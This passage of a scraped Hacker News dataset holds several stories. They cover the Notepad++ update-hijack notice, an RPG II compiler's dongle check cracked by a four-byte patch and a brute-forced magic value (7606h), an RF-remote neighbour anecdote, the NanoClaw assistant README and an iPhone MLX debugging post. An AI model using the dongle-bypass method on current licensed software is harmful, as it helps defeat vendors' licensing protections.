was compromised until September 2, 2025. Even after losing server access, attackers maintained credentials to internal services until December 2, 2025, which allowed them to continue redirecting Notepad++ update traffic to malicious servers. The attackers specifically targeted Notepad++ domain with the goal of exploiting insufficient update verification controls that existed in older versions of Notepad++.\nAll remediation and security hardening were completed by the provider by December 2, 2025, successfully blocking further attacker activity.\n\nNote on timelines:The security expertâ€™s analysis indicates the attack ceased on November 10, 2025, while the hosting providerâ€™s statement shows potential attacker access until December 2, 2025. Based on both assessment, I estimate the overall compromise period spanned from June through December 2, 2025, when all attacker access was definitively terminated.\n\nTo address this severe security issue, the Notepad++ website has been migrated to a new hosting provider with significantly stronger security practices.Within Notepad++ itself, WinGup (the updater) was enhanced in v8.8.9 to verify both the certificate and the signature of the downloaded installer. Additionally, the XML returned by the update server is now signed (XMLDSig), and the certificate & signature verification will be enforced starting with upcoming v8.9.2, expected in about one month.\n\nI deeply apologize to all users affected by this hijacking.I recommenddownloading v8.9.1(which includes the relevant security enhancement) and running the installer to update your Notepad++ manually.\n\nWith these changes and reinforcements, I believe the situation has been fully resolved.\nFingers crossed.\n\nEdit (February 2, 2026):Iâ€™ve got a lot of emails requesting the IoC (Indicator of Compromise). I unfortunately do not have any IoCs to share. Our IR team spent a week analyzing roughly 400Ã¢Â€Â¯GB of server logs provided by the former hosting provider. While signs of an intrusion were identified, no concrete indicators of compromise - such as binary hashes, domains, or IP addresses - were found. We also requested IoCs directly from the former hosting provider, but we were not able to obtain any.\n\nEdit 2 (February 3, 2026):Last evening I recieved an email from Ivan Feigl (Rapid7) to share their excellentinvestigation story- it seems to be the same story, and obviously, they have more tangible information (including IoCs) than I do.",
      "url": "https://notepad-plus-plus.org/news/hijacked-incident-info-update/",
      "author_username": "mysterydip",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 888,
      "impressions_reposts": 0,
      "impressions_replies": 498,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:50.538506",
      "published_at": "2026-02-01T20:59:56",
      "scraped_at": "2026-02-03T09:02:50.538531",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46851548",
        "kids_count": 49,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "a088db8fc69374f86bb6dc79faaa4a7f"
    },
    {
      "id": "37dff9eda75b1c215adb67b4c7fba078",
      "source": "hackernews",
      "source_id": "46849567",
      "title": "Defeating a 40-year-old copy protection dongle",
      "content": "Thatâ€™s right â€” this little device is what stood between me and the ability to run aneven olderpiece of software that I recently unearthed during an expedition of software archaeology.\n\nFor a bit more background, I was recently involved in helping a friendâ€™s accounting firm to move away from using anextremelylegacy software package that they had locked themselves into using for the last four decades.\n\nThis software was built using a programming language calledRPG(â€œReport Program Generatorâ€), which is older than COBOL (!), and was used with IBMâ€™s midrange computers such as the System/3, System/32, and all the way up to the AS/400. Apparently, RPG was subsequently ported to MS-DOS, so that the same software tools built with RPG could run on personal computers, which is how we ended up here.\n\nThis accounting firm was actually using a Windows 98 computer (yep, in 2026), and running the RPG software inside a DOS console window. And it turned out that, in order to run this software, it requires a special hardware copy-protection dongle to be attached to the computerâ€™s parallel port! This was a relatively common practice in those days, particularly with â€œenterpriseâ€ software vendors who wanted to protect their very importantâ„¢ software from unauthorized use.\n\nSadly, most of the text and markings on the dongleâ€™s label has been worn or scratched off, but we can make out several clues:\n\nThe words â€œStamford, CTâ€, and whatâ€™s very likely the logo of a company called â€œSoftware Security Incâ€. The only evidence for the existence of this company is this record of them exhibiting their wares atSIGGRAPH conferencesin the early 1990s, as well as severalpatentsissued to them, relating to software protection.\n\nA word that seems to say â€œRUNTIMEâ€, which will become clear in a bit.\n\nMy first course of action was to take a disk image of the Windows 98 PC that was running this software, and get it running in an emulator, so that we could see what the software actually does, and perhaps export the data from this software into a more modern format, to be used with modern accounting tools. But of course all of this requires the hardware dongle; none of the accounting tools seem to work without it plugged in.\n\nBefore doing anything, I looked through the disk image for any additional interesting clues, and found plenty of fascinating (and archaeologically significant?) stuff:\n\nWeâ€™ve got a compiler for the RPG II language (excellent!), made by a company called Software West Inc.\n\nEven better, there aretwo versionsof the RPG II compiler, released on various dates in the 1990s by Software West.\n\nWeâ€™ve got the complete source code of the accounting software, written in RPG. It looks like the full accounting package consists of numerous RPG modules, with a gnarly combination of DOS batch files for orchestrating them, all set up as a â€œmenuâ€ system for the user to navigate using number combinations. Clearly the author of this accounting system was originally an IBM mainframe programmer, and insisted on bringing those skills over to DOS, with mixed results.\n\nI began by playing around with the RPG compiler in isolation, and I learned very quickly that itâ€™s the RPG compiler itself that requires the hardware dongle, and then the compiler automatically injects the same copy-protection logic into any executables it generates. This explains the text that seems to say â€œRUNTIMEâ€ on the dongle.\n\nThe compiler consists of a few executable files, notablyRPGC.EXE, which is the compiler, andSEU.EXE, which is a source editor (â€œSource Entry Utilityâ€). Hereâ€™s what we get when we launch SEU without the dongle, after a couple of seconds:\n\nA bit rude, but this gives us an important clue: this program must be trying to communicate over the parallel port over the course of a few seconds (which could give us an opportunity to pause it for debugging, and see what itâ€™s doing during that time), and then exits with a message (which we can now find in a disassembly of the program, and trace how it gets there).\n\nA great tool for disassembling executables of this vintage isReko. It understands 16-bit real mode executables, and even attempts to decompile them into readable C code that corresponds to the disassembly.\n\nAnd so, looking at the decompiled/disassembled code in Reko, I expected to findinandoutinstructions, which would be the telltale sign of the program trying to communicate with the parallel port through the PCâ€™s I/O ports. Howeverâ€¦ I didnâ€™t see aninoroutinstruction anywhere! But then I noticed something: Reko disassembled the executable into two â€œsegmentsâ€:0800and0809, and I was only looking at segment0809.\n\nIf we look at segment0800, we see the smoking gun:inandoutinstructions, meaning that the copy-protection routine is definitely here, and best of all, the entire code segment is a mere 0x90 bytes, which suggests that the entire routine should be pretty easy to unravel and understand. For some reason, Reko was not able to decompile this code into a C representation, but it still produced a disassembly, which will work just fine for our purposes. Maybe this was a primitive form of obfuscation from those early days, which is now confusing Reko and preventing it from associating this chunk of code with the rest of the programâ€¦ who knows.\n\nHere is a GitHub Gist with thedisassembly of this code, along with my annotations and notes. My x86 assembly knowledge is a little rusty, but here is the gist of what this code does:\n\nItâ€™s definitely a single self-contained routine, intended to be called using a â€œfarâ€CALLinstruction, since it returns with aRETFinstruction.\n\nIt begins by detecting the address of the parallel port, by reading theBIOS data area. If the computer has more than one parallel port, the dongle must be connected to thefirstparallel port (LPT1).\n\nIt performs a loop where it writes values to the data register of the parallel port, and then reads the status register, and accumulates responses in theBHandBLregisters.\n\nAt the end of the routine, the â€œresultâ€ of the whole procedure is stored in theBXregister (BHandBLtogether), which will presumably be â€œverifiedâ€ by the caller of the routine.\n\nVery importantly, there doesnâ€™t seem to be any â€œinputâ€ into this routine. It doesnâ€™t pop anything from the stack, nor does it care about any register values passed into it. Which can only mean that the result of this routine iscompletely constant! No matter what complicated back-and-forth it does with the dongle, the result of this routine should always be the same.\n\nWith the knowledge that this routine must exit with some magic value stored inBX, we can now patch the first few bytes of the routine to do just that! Not yet knowing which value to put inBX, letâ€™s start with 1234:\n\nOnly the first four bytes need patching â€” setBXto our desired value, and get out of there (RETF). Running the patched executable with these new bytes still fails (expectedly) with the same message of â€œNo dongle, no editâ€, but it fails immediately, instead of after several seconds of talking to the parallel port. Progress!\n\nStepping through the disassembly more closely, we get another major clue: The only value thatBHcan be at the end of the routine is 76h (this is hard-coded into the routine). So, our total value for the magic number inBXmust be of the form 76xx. In other words, only theBLvalue remains unknown:\n\nSinceBLis an 8-bit register, it can only have 256 possible values. And what do we do when we have 256 combinations to try? Brute force it! I whipped up a script that plugs a value into that particular byte (from 0 to 255) and programmatically launches the executable in DosBox, and observes the output. Lo and behold, it worked! The brute forcing didnâ€™t take long at all, because the correct number turned out to beâ€¦6. Meaning that the total magic number inBXshould be 7606h:\n\nBingo!And then, proceeding to examine the other executable files in the compiler suite, the parallel port routine turns out to beexactly the same. All of the executables have the exact same copy protection logic, as if it was rubber-stamped onto them. In fact, when the compiler (RPGC.EXE) compiles some RPG source code, it seems to copy the parallel port routine from itself into the compiled program. Thatâ€™s right: the patched version of the compiler will produce executables with the same patched copy protection routine! Very convenient.\n\nI must say, this copy protection mechanism seems a bitâ€¦ simplistic? A hardware dongle that just passes back a constant number? Defeatable with a four-byte patch? Is this really worthy of a patent? But who am I to pass judgment. Itâ€™s possible that I havenâ€™t fully understood the logic, and the copy protection will somehow re-surface in another way. Itâ€™s also possible that the creators of the RPG compiler (Software West, Inc) didnâ€™t take proper advantage of the hardware dongle, and used it in a way that is so easily bypassed.\n\nIn any case, Software Westâ€™s RPG II compiler is now free from the constraint of the parallel port dongle! And at some point soon, Iâ€™ll work on purging any PII from the compiler directories, and make this compiler available as an artifact of computing history. It doesnâ€™t seem to be available anywhere else on the web. If anyone reading this was associated with Software West Inc, feel free to get in touch â€” I have many questions!",
      "url": "https://dmitrybrant.com/2026/02/01/defeating-a-40-year-old-copy-protection-dongle",
      "author_username": "zdw",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 834,
      "impressions_reposts": 0,
      "impressions_replies": 281,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:50.943300",
      "published_at": "2026-02-01T16:30:51",
      "scraped_at": "2026-02-03T09:02:50.943312",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46849567",
        "kids_count": 61,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "11b2547884f78e9b6a93498b728c5741"
    },
    {
      "id": "209cea59947e1fd2b3756c59b5dd589a",
      "source": "hackernews",
      "source_id": "46848415",
      "title": "Teaching my neighbor to keep the volume down",
      "content": "When I moved to a new apartment with my family, the cable company we were used to wasn't available. We had to settle for Dish Network. I wasn't too happy about making that switch, but something on their website caught my attention. For an additional $5 a month, I could have access to DVR. I switched immediately.\n\nThis was 2007. DVR was not new, but it wasn't commonly bundled with set-top boxes. TiVo was still the popular way to record, pause, and rewind live TV. We received two set-top boxes, one for each room with a TV, and three remotes. Two remotes had IR (infrared) blasters and, surprisingly, one RF (radio frequency) remote.\n\nAfter using the RF remote, I wondered: Why would anyone ever use an IR remote again? You didn't need a direct line of sight with the device you were controlling. I could actually stand in the kitchen and control the TV. It was amazing. But with the convenience of RF came other problems that IR users never had to worry about. Interference.\n\nAfter several months of enjoying my service, one of my neighbors, the loudest in the building, also switched to Dish Network. And he also got the RF remote. This was the type of neighbor who would leave the house with the TV on, volume blasting.\n\nOne day, I was in the living room watching TV when the channel just flipped. I must have accidentally hit a button, so I changed it back. But not a few seconds later, the channel changed again. Then the volume went up. I figured my sister must have had the RF remote and was messing with me. But no, the remote was in my hand. I assumed something was wrong with it.\n\nThe whole time I was watching TV, the channels kept randomly switching. I banged the remote on the table a couple of times, but it still switched. I removed the batteries from the remote, it still switched. I unplugged the device for a few minutes, plugged it back in, andâ€¦ it still switched. Frustrated, I went through the device settings and disabled the RF remote. That's when it finally stopped. I wasn't happy with this solution, but it allowed me to watch TV until I figured something out.\n\nOne evening, when everyone was asleep and the neighbor was watching a loud TV show, I decided to diagnose the issue. The moment I pressed the power button on the RF remote, my TV and set-top box turned on, and the neighbor's TV went silent. \"Fuck!\" I heard someone say. I was confused. Did I just do that? The TV turned back on, the volume went up. I walked to the window armed with the remote. I counted to three, then pressed the power button. My neighbor's TV went silent. He growled.\n\nI am the captain now.\n\nEvery time he turned the TV on, I pressed the power button again and his device went off. Well, what do you know? We had interference somehow. Our remotes were set up to operate at the same frequency. Each remote controlled both devices.\n\nBut I'm not that kind of neighbor. I wasn't going to continue to mess with him. Instead, I decided I would pay him a visit in the morning and explain that our remotes are tuned to the same frequency. I would bring the RF remote with me just to show him a demo. I was going to be a good neighbor.\n\nIn the morning, I went downstairs, remote in hand. I knocked on the door, and a gentleman in his forties answered the door. I had rehearsed my speech and presentation. This would be a good opportunity to build a good rapport, and have a shared story. Maybe he would tell me how he felt when the TV went off. How he thought there was a ghost in the house or something. But that's not what happened.\n\n\"Hi, I'm Ibrahim. Your upstairs neighbor...\" I started and was interrupted almost immediately. \"Whatever you are selling,\" he yelled. \"I'm not buying.\" and he closed the door on my face. I knocked a second time, because obviously there was a misunderstanding. He never answered. Instead, the TV turned on and a movie played at high volume. So much for my prepared speech.\n\nThe RF settings on my set-top box remained turned off. My family never discovered its benefit anyway, they always pointed at the box when pressing the buttons. It wasn't much of an inconvenience. In fact, I later found in the manual that you could reprogram the device and remote to use a different frequency. I did not reprogram my remote. Instead, my family used the two IR remotes, and brought the RF remote in my bedroom where it permanently remained on my night stand.\n\nWhy in the bedroom? Because I decided to teach my neighbor some good manners. Whenever he turned up his volume, I would simply turn off his device. I would hear his frustration, and his attempts at solving the problem. Like a circus animal trainer, I remained consistent. If the volume of his TV went above what I imagined to be 15 to 20, I would press the power button. It became a routine for me for weeks. Some nights were difficult, I would keep the remote under my pillow, battling my stubborn neighbor all night.\n\nOne day, I noticed that I hadn't pressed the button in days. I opened the window and I could still hear the faint sound of his TV. Through trial and error, he learned the lesson. If the volume remained under my arbitrary threshold, the TV would remain on. But as soon as he passed that threshold, the device would turn off.\n\nSometimes, he would have company and there would be noise coming out of his apartment. I used the one tool in my tool box to send him a message. Turn off the TV. All of the sudden, my neighbor and his guest will be reminded of the unspoken rules, and become mindful of their neighbors.\n\nMaybe somewhere on the web, in some obscure forum, someone asked the question: \"Why does my set-top box turn off when I increase the volume?\" Well, it might be 18 years too late, but there's your answer. There is a man out there who religiously sets his volume to 18. He doesn't quite know why. That's Pavlovian conditioning at its best.\n\nDid you like this article?You can buy me a coffee.Share your insightful comments here.\n\nJoin my newsletter\n\nFollow me onTwitter,Spotify, orRSS\n\t\t\t\t\t\tFeed\n\nOn a related note, here are some interesting articles.\n\nThe Problem with Hype\n\nThe main problem with hype is that it keeps us from appreciating what we already have. Itâ€™s always about the next big thing. Something revolutionary just over the horizon. But while weâ€™re busy chasing the future, we overlook the real progress happening right under our noses.\n\nThe Scotsman AI Fallacy\n\nWhen someone shares a genuine frustration with AI like a hallucination, a bias, or a workflow meltdown, like clockwork the replies are always the same:\n\n\n\"Youâ€™re just not using it right.\"\n\"Skill issue.\"\n\"Prompt better.\"\n\nThe â€œPerfectâ€ YouTube Video\n\nMy brother sent me a short about crypto on YouTube. It was a funny video about how crypto bros entice you into their platform by letting you make small wins at first, until you decide to invest a large sum. Then, all your money disappears.\n\nComments(3)\n\nlouisa day ago:\n\nthat was a funny read, thanks for sharing\n\nShawna day ago:\n\nObligatoryxkcd:https://xkcd.com/316/\n\nYounes Ben Amara11 hours ago:\n\nLanded here from HN, that was much-needed good laugh, thanks a lot.",
      "url": "https://idiallo.com/blog/teaching-my-neighbor-to-keep-the-volume-down",
      "author_username": "firefoxd",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://cdn.idiallo.com/images/assets/601/remote.jpg",
          "alt": "Dish Network Remote 2008"
        },
        {
          "type": "image",
          "url": "https://cdn.idiallo.com/images/assets/601/captain.jpg",
          "alt": "I am the captain now"
        },
        {
          "type": "image",
          "url": "https://cdn.idiallo.com/images/assets/thumb/default-thumb-2.jpg",
          "alt": "The Problem with Hype"
        },
        {
          "type": "image",
          "url": "https://cdn.idiallo.com/images/assets/thumb/default-thumb-3.jpg",
          "alt": "The Scotsman AI Fallacy"
        },
        {
          "type": "image",
          "url": "https://cdn.idiallo.com/images/assets/521/thumb.jpg",
          "alt": "The â€œPerfectâ€ YouTube Video"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 814,
      "impressions_reposts": 0,
      "impressions_replies": 359,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:51.376391",
      "published_at": "2026-02-01T14:00:46",
      "scraped_at": "2026-02-03T09:02:51.376402",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46848415",
        "kids_count": 58,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "5d3e15e9e80f34e194b39ac645745951"
    },
    {
      "id": "9fccf8033fd430ac4b861095a4d769b4",
      "source": "hackernews",
      "source_id": "46850205",
      "title": "Show HN: NanoClaw â€“ â€œClawdbotâ€ in 500 lines of TS with Apple container isolation",
      "content": "My personal Claude assistant that runs securely in containers. Lightweight and built to be understood and customized for your own needs.\n\nWhy I Built This\n\nOpenClawis an impressive project with a great vision. But I can't sleep well running software I don't understand with access to my life. OpenClaw has 52+ modules, 8 config management files, 45+ dependencies, and abstractions for 15 channel providers. Security is application-level (allowlists, pairing codes) rather than OS isolation. Everything runs in one Node process with shared memory.\n\nNanoClaw gives you the same core functionality in a codebase you can understand in 8 minutes. One process. A handful of files. Agents run in actual Linux containers with filesystem isolation, not behind permission checks.\n\nQuick Start\n\nThen run/setup. Claude Code handles everything: dependencies, authentication, container setup, service configuration.\n\nPhilosophy\n\nSmall enough to understand.One process, a few source files. No microservices, no message queues, no abstraction layers. Have Claude Code walk you through it.\n\nSecure by isolation.Agents run in Linux containers (Apple Container on macOS, or Docker). They can only see what's explicitly mounted. Bash access is safe because commands run inside the container, not on your host.\n\nBuilt for one user.This isn't a framework. It's working software that fits my exact needs. You fork it and have Claude Code make it match your exact needs.\n\nCustomization = code changes.No configuration sprawl. Want different behavior? Modify the code. The codebase is small enough that this is safe.\n\nAI-native.No installation wizard; Claude Code guides setup. No monitoring dashboard; ask Claude what's happening. No debugging tools; describe the problem, Claude fixes it.\n\nSkills over features.Contributors shouldn't add features (e.g. support for Telegram) to the codebase. Instead, they contributeclaude code skillslike/add-telegramthat transform your fork. You end up with clean code that does exactly what you need.\n\nBest harness, best model.This runs on Claude Agent SDK, which means you're running Claude Code directly. The harness matters. A bad harness makes even smart models seem dumb, a good harness gives them superpowers. Claude Code is (IMO) the best harness available.\n\nNo ToS gray areas.Because it uses Claude Agent SDK natively with no hacks or workarounds, using your subscription with your auth token is completely legitimate (I think). No risk of being shut down for terms of service violations (I am not a lawyer).\n\nWhat It Supports\n\nWhatsApp I/O- Message Claude from your phone\n\nIsolated group context- Each group has its ownCLAUDE.mdmemory, isolated filesystem, and runs in its own container sandbox with only that filesystem mounted\n\nMain channel- Your private channel (self-chat) for admin control; every other group is completely isolated\n\nScheduled tasks- Recurring jobs that run Claude and can message you back\n\nWeb access- Search and fetch content\n\nContainer isolation- Agents sandboxed in Apple Container (macOS) or Docker (macOS/Linux)\n\nOptional integrations- Add Gmail (/add-gmail) and more via skills\n\nUsage\n\nTalk to your assistant with the trigger word (default:@Andy):\n\nFrom the main channel (your self-chat), you can manage groups and tasks:\n\nCustomizing\n\nThere are no configuration files to learn. Just tell Claude Code what you want:\n\n\"Change the trigger word to @Bob\"\n\n\"Remember in the future to make responses shorter and more direct\"\n\n\"Add a custom greeting when I say good morning\"\n\n\"Store conversation summaries weekly\"\n\nOr run/customizefor guided changes.\n\nThe codebase is small enough that Claude can safely modify it.\n\nContributing\n\nDon't add features. Add skills.\n\nIf you want to add Telegram support, don't create a PR that adds Telegram alongside WhatsApp. Instead, contribute a skill file (.claude/skills/add-telegram/SKILL.md) that teaches Claude Code how to transform a NanoClaw installation to use Telegram.\n\nUsers then run/add-telegramon their fork and get clean code that does exactly what they need, not a bloated system trying to support every use case.\n\nRFS (Request for Skills)\n\nSkills we'd love to see:\n\nCommunication Channels\n\n/add-telegram- Add Telegram as channel. Should give the user option to replace WhatsApp or add as additional channel. Also should be possible to add it as a control channel (where it can trigger actions) or just a channel that can be used in actions triggered elsewhere\n\n/add-slack- Add Slack\n\n/add-discord- Add Discord\n\nPlatform Support\n\n/setup-windows- Windows via WSL2 + Docker\n\nSession Management\n\n/add-clear- Add a/clearcommand that compacts the conversation (summarizes context while preserving critical information in the same session). Requires figuring out how to trigger compaction programmatically via the Claude Agent SDK.\n\nRequirements\n\nmacOS or Linux\n\nNode.js 20+\n\nClaude Code\n\nApple Container(macOS) orDocker(macOS/Linux)\n\nArchitecture\n\nSingle Node.js process. Agents execute in isolated Linux containers with mounted directories. IPC via filesystem. No daemons, no queues, no complexity.\n\nKey files:\n\nsrc/index.ts- Main app: WhatsApp connection, routing, IPC\n\nsrc/container-runner.ts- Spawns agent containers\n\nsrc/task-scheduler.ts- Runs scheduled tasks\n\nsrc/db.ts- SQLite operations\n\ngroups/*/CLAUDE.md- Per-group memory\n\nFAQ\n\nWhy WhatsApp and not Telegram/Signal/etc?\n\nBecause I use WhatsApp. Fork it and run a skill to change it. That's the whole point.\n\nWhy Apple Container instead of Docker?\n\nOn macOS, Apple Container is lightweight, fast, and optimized for Apple silicon. But Docker is also fully supportedâ€”during/setup, you can choose which runtime to use. On Linux, Docker is used automatically.\n\nCan I run this on Linux?\n\nYes. Run/setupand it will automatically configure Docker as the container runtime. Thanks to@dotsetgregfor contributing the/convert-to-dockerskill.\n\nIs this secure?\n\nAgents run in containers, not behind application-level permission checks. They can only access explicitly mounted directories. You should still review what you're running, but the codebase is small enough that you actually can. Seedocs/SECURITY.mdfor the full security model.\n\nWhy no configuration files?\n\nWe don't want configuration sprawl. Every user should customize it to so that the code matches exactly what they want rather than configuring a generic system. If you like having config files, tell Claude to add them.\n\nHow do I debug issues?\n\nAsk Claude Code. \"Why isn't the scheduler running?\" \"What's in the recent logs?\" \"Why did this message not get a response?\" That's the AI-native approach.\n\nWhy isn't the setup working for me?\n\nI don't know. Runclaude, then run/debug. If claude finds an issue that is likely affecting other users, open a PR to modify the setup SKILL.md.\n\nWhat changes will be accepted into the codebase?\n\nSecurity fixes, bug fixes, and clear improvements to the base configuration. That's it.\n\nEverything else (new capabilities, OS compatibility, hardware support, enhancements) should be contributed as skills.\n\nThis keeps the base system minimal and lets every user customize their installation without inheriting features they don't want.\n\nLicense\n\nMIT",
      "url": "https://github.com/gavrielc/nanoclaw",
      "author_username": "jimminyx",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 515,
      "impressions_reposts": 0,
      "impressions_replies": 219,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:52.941336",
      "published_at": "2026-02-01T17:49:22",
      "scraped_at": "2026-02-03T09:02:52.941348",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46850205",
        "kids_count": 47,
        "sections": [
          "best_stories",
          "show_hn"
        ]
      },
      "content_hash": "6a51b8d48ffa7dfbc372f1f9ed390ab6"
    },
    {
      "id": "42b5f4ecae2032cd5e411c80cdc103b9",
      "source": "hackernews",
      "source_id": "46849258",
      "title": "My iPhone 16 Pro Max produces garbage output when running MLX LLMs",
      "content": "TL;DR:\n\nMy iPhone 16 Pro Max produces garbage output when running MLX LLMs. An iPhone 15 Pro runs the same code perfectly. A MacBook Pro also runs the same code perfectly. The tensor outputs on the 16 show numerical values an order of magnitude wrong. I suspect it points to a hardware defect in the Neural Engine or some other ML-needed system.\n\nIt was a PITA to debug, but at least I got a blog post out of it.\n\nHow did I get there?\n\nThis was supposed to be a simple, unwinding-time project.\n\nFor the past few months I've been working on aClawdbotMoltbot clone that I've been calling Schmidt. It basically does the same kind of thing but with a custom chat UI instead of using Telegram, WhatsApp or other \"I-can't-afford-to-be-banned-from\" Service. This project has been consuming early days and late nights, so, to unwind, I decided that it may be a good idea to do something simpler. Since I recently subscribed to MiniMax M2.1, I thought I would do what many do and build a simple expense tracking app to test out the model.\n\nThe core functionality is simple:\n\nAutomatically, upon each payment, add the expense to my app\n\nUpdate an Apple Watch complication with the % of my monthly budget spent\n\nCategorize the purchase for later analysis\n\nThis all comes from being basically orphaned by Nubank's amazing native app (since replaced by a less-full-featured Flutter version).\n\nIntegrating with Shortcuts is manual, but reliable. Within 15 minutes I had a version of the app that could register purchases. The Apple Watch complication, the main goal, can come later. I'd rather get the classification feature, which should be easy, done quickly â€“ so I figured.\n\nApple Intelligence\n\nGiven the new LLM-bonanza we've been living through, it's no surprise that Apple has their own set of APIs developers such as me can use. Reading up on the documentation, it's a matter of checking for the availability of the feature and then asking the model to either reply to a textual query or, in my case, categorize a request.\n\nMiniMax raced through it in a single prompt and then I ran it on my iPhone. First expense was a purchase at a shop called \"Kasai Kitchin\", classified as...unknown.Weird.\n\nChecking the logs, it was clear: the model support was downloading. The feature hadn't been enabled. Again, weird. I should have it on. Anyway, I go into settings, do the weird dance of toggling it on and off â€“ sadly, that's not surprising on Apple's services. Maybe my Settings.app got stuck in a weird state, who knows? â€“ and wait for it to download.\n\nAfter 4h I realized it was not going anywhere. Looking it up, it seems that many have the same issue (thisthread shows 12 pages of frustrated users). Again, not a surprise for Apple's services recently.\n\nOh well, time to give up on the Apple Intelligence approach. Let's move on to the next one.\n\nMLX LLM\n\nWell, the iOS framework engineers don't seem to be the only engineers at Apple capable of coming up with Machine Learning APIs in Swift. Apparently, there's a whole separate way of doing it â€“ with models downloaded to your app. Not great for the user's storage, but great for me!\n\nAgain, MiniMax does it in a heartbeat, specially after being given documentation and one or two Medium posts. Time to run on my iPhone and... gibberish.\n\nThe CPU spins to 100% and the model starts generating. But it's all gibberish. And no \"stop\" token is generated, so this goes on for long.\n\nAt this point, the only explanation is: I'm completely incompetent and can't even get a simple \"ready made\" framework to execute what I want. Or, rather,MiniMax is! The good thing about offloading your work to an LLM is that you can blame it for your shortcomings. Time to get my hands dirty and do it myself, typing code on my keyboard, like the ancient Mayan and Aztec programmers probably did.\n\nMy own MLX implementation\n\nI went back to the documentation, to the Medium posts and, much to my surprise: MiniMax had followed it to the letter. Even went back to some deprecated methods of generation and it also was gibberish. And now there's no one to blame, but myself. I go to work everyday and this impostor-syndrome inducing problem silently consumes me.After 3 days of trying to get it to work, I'm ready to give up......until, on a Tuesday morning, at 7-8 AM, I have an idea: let me, just in case, run this on my old iPhone 15 Pro. Up to this point, I was running it on my daily driver, an iPhone 16 Pro Max that was a replacement phone sent by Apple Care after a small clubbing mishap (in which my iPhone was irreparably crashed). I rush to get everything ready before it's time to go to work and: it works! Gemma, Qwen, and all other models generate coherent responses!\n\nI stop and think: this cannot be a hardware issue,right? Of course not. The iPhone 15 is still running iOS 18. The iPhone 16 is running 26. Itmust be an OS issue. Well, time to be late for my work standup and update the old phone. The curiosity is too much. Many minutes later... same results, now on iOS 26. The plot is thickening.\n\nFinding the smoking gun: breakpoints in MLX's implementations of Gemma\n\nAfter that work day, and after many lunch and coffee discussions with coworkers about the sources of my troubles, I get home and immediately set myself on debugging MLX as it runs, if possible. The game plan is:\n\nUse a known-to-be-reliable model, that fits in RAM (I went with quantized Gemma)\n\nUse a simple prompt, in my case \"What is 2+2?\"To bereallypedantic: the prompt was<start_of_turn>user\\nWhat is 2+2?<end_of_turn>\\n<start_of_turn>model\n\nTo bereallypedantic: the prompt was<start_of_turn>user\\nWhat is 2+2?<end_of_turn>\\n<start_of_turn>model\n\nRun everything with temperature set to0.0â€“ maybe that's enough to remove variability\n\nFind the model implementation\n\nFind where the model iterates through the layers and\n\nPrint out the MLXArray/Tensor with the values on each layer as the input goes through\n\nA few moments later and I find where I need to be. Added the breakpoints, added the logs and off to the races.\n\nI run it on my iPhone 16 Pro Max. The model loads and the prompt is \"What is 2+2?\". The tensors start printing out, line after line after line. For once, the logs aren'tcompletegibberish â€“ they're numbers. Floating point values representing the model's internal state as it processes the input. I save the output to a file and do the same on my iPhone 15 Pro. Same model, same prompt, same code. Time to compare.\n\nWelp, now it's definitely out of my expertise\n\nI grep for a pattern I know should be consistent â€“ an array at log-line 58, right before the values get normalized/softmaxed. On a working device, I hypothesize this should be the same every time.On the iPhone 15 Pro:3: \"[[[[53.875, 62.5625, -187.75, ..., 42.625, 6.25, -21.5625]]]]\"On the iPhone 16 Pro Max:3: \"[[[[191.5, 23.625, 173.75, ..., 1298, -147.25, -162.5]]]]\"Huh. Not close. Not at all. These values are orders of magnitude off. I double check the start of the logs and both phones show the same:1: \"array([[[0.162842, -0.162842, -0.48877, ..., -0.176636, 0.0001297, 0.088501],\\n [-0.348633, -2.78906, 0, ..., 0.84668, 0, -1.69336],\\n [-1.30957, 1.57324, -1.30957, ..., -0.0010376, -0.0010376, 1.12305],\\n ...,\\n [-0.348633, -2.78906, 0, ..., 0.84668, 0, -1.69336],\\n [0.296875, 0.59375, 0.890625, ..., -0.59375, 0.296875, -0.890137],\\n [1.02734, -0.616211, -0.616211, ..., -0.275879, -0.551758, 0.275879]]], dtype=float16)\"\n\nOK, so the model receives the same thing as input, but at some point, the values start to go off. Like,way off. In order to make sure I'm not crazy, I do one last thing: run the same thing on my Mac. Make the app run on iPad compatibility mode and...3: \"[[[[53.875, 62.5625, -187.75, ..., 42.625, 6.25, -21.5625]]]]\"\n\nBingo! Same as iPhone 15!\n\nThe model isn't broken. The code isn't broken. Most importantly, I'm not broken*. Myphoneis broken.*arguable, but besides the point here\n\nWhat's going on?\n\nLet me explain what I think it's going on here: the iPhone 16 Pro Max contains Apple's A18 chip with its Neural Engineâ€”a specialized accelerator for machine learning operations. MLX uses Metal to compile tensor operations for this accelerator. Somewhere in that stack, the computations are goingverywrong. I don't think it's a widespread issue but, I do get disappointed that a relatively newly replaced iPhone from Apple Care came with such an issue.\n\nHowever, if my Apple Intelligence troubles are related â€“ and they might as well be, I'd assume that code and MLX are not dissimilar in operations being done â€“, it could be thatall the 12 pages of usersare users in a similar dillema, but without the means of debugging it.\n\nWhat now?\n\nI spent 3 days thinking I was incompetent. I blamed MiniMax. I blamed myself. The entire time, my $1,400 phone had a broken hardware. I could lose more time figuring outexactlywhat is wrong with it but itâ€™s literally not worth my time.\n\nI guess I can at least take a lesson that, when debugging, I should always consider the physical layer. I spent three days assuming this was a 